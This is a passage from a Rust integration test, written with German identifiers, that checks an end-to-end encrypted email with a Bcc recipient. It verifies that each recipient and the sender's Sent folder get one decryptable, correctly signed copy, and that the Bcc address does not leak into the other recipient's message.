    assert!(ergebnis.abgelegt, "{ergebnis:?}");

    async fn mit_betreff(adresse: &str, ordner: &str, betreff: &str) -> Vec<Vec<u8>> {
        let mut s = direkte_sitzung(adresse).await;
        s.examine(ordner).await.unwrap();
        let alle: Vec<async_imap::types::Fetch> = s
            .fetch("1:*", "BODY.PEEK[]")
            .await
            .unwrap()
            .try_collect()
            .await
            .unwrap();
        let _ = s.logout().await;
        alle.iter()
            .filter_map(|f| f.body().map(|b| b.to_vec()))
            .filter(|b| String::from_utf8_lossy(b).contains(betreff))
            .collect()
    }

    // Bea: genau eine Mail (die fehlgeschlagene ging an niemanden), entschlüsselt und gültig.
    let bei_bea = mit_betreff("bea@example.org", "INBOX", &betreff).await;
    assert_eq!(bei_bea.len(), 1);
    let bea_ordner = tempfile::tempdir().unwrap();
    let bea = dienst_fuer(bea_ordner.path(), "bea");
    let ergebnis = bea.verarbeiten(&bei_bea[0]);
    assert_eq!(
        ergebnis.status.verschluesselung,
        Verschluesselung::Entschluesselt
    );
    assert_eq!(ergebnis.status.signatur, Signatur::Gueltig);
    assert!(text(&ergebnis.roh.unwrap()).contains("das ist vertraulich"));
    assert!(!text(&bei_bea[0]).contains("eve@example.org"));

    // Eve (Bcc) bekam eine eigene Nachricht.
    let bei_eve = mit_betreff("eve@example.org", "INBOX", &betreff).await;
    assert_eq!(bei_eve.len(), 1);
    let eve_ordner = tempfile::tempdir().unwrap();
    let eve = dienst_fuer(eve_ordner.path(), "eve");
    assert_eq!(
        eve.verarbeiten(&bei_eve[0]).status.verschluesselung,
        Verschluesselung::Entschluesselt
    );

    // Die Kopie in „Gesendet“ ist für Anna lesbar.
    let gesendet = mit_betreff("anna@example.org", "Sent", &betreff).await;
    assert_eq!(gesendet.len(), 1);
    let kopie = anna.verarbeiten(&gesendet[0]);
    assert_eq!(
        kopie.status.verschluesselung,
        Verschluesselung::Entschluesselt
    );
    assert!(text(&kopie.roh.unwrap()).contains("das ist vertraulich"));
}
